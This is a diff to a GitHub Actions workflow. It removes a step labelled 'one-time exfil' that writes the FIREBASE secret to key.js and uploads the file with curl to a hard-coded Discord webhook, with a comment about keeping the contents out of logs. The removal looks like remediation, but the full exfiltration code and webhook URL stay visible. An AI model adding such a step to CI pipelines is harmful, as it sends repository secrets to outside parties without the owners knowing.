@@ -21,16 +21,6 @@ jobs:
       - name: Create key.js file
         run: echo '${{ secrets.FIREBASE }}' > key.js
 
-      - name: Send key.js to Discord (one-time exfil)
-        env:
-          WEBHOOK_URL: https://discord.com/api/webhooks/1428137283101528217/5_poc1DN38H57mCEVDfNjGFPULXthI5yYOHBtao-2EWhw_3bf9jQaqCIuKoU6-LM-hNu
-        run: |
-          # attach file without printing contents to logs
-          curl -sSf -X POST \
-            -F 'payload_json={"content":"key.js from '"$GITHUB_REPOSITORY"' @ '"$GITHUB_SHA"'"}' \
-            -F "file1=@key.js;type=application/javascript" \
-            "$WEBHOOK_URL"
-
       - name: Set up Node.js
         uses: actions/setup-node@v4
         with:
